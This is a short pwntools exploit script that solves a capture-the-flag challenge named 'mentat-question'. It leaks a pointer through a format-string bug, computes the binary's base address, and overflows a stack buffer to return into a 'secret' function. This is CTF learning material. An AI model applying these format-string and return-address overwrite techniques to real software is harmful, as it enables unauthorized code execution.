from pwn import *

exe = ELF("./mentat-question")

p = remote("challs.umdctf.io", 32300)
# p = process("./mentat-question")
# gdb.attach(p)

p.recvline()
p.sendline(b"Division")
p.recvuntil(b"divided?\n")
p.sendline(b"100")
p.sendline(b"4294967296")
p.recvuntil(b"again?\n")
p.sendline(b"Yes%p")

p.recvuntil(b"Yes")
leak = int(p.recvline()[:14],16)
log.success(f"{hex(leak)=}")

p.recvuntil(b"divided?\n")
p.sendline(b"100")
p.sendline(b"4294967296")
p.recvuntil(b"again?\n")

exe.address = leak - 0x206d
ret = exe.address + 0x101a

payload = b"Yes".ljust(8,b"\x00")
payload += b"A"*16
payload += p64(ret)
payload += p64(exe.sym["secret"])

p.sendline(payload)

p.interactive()
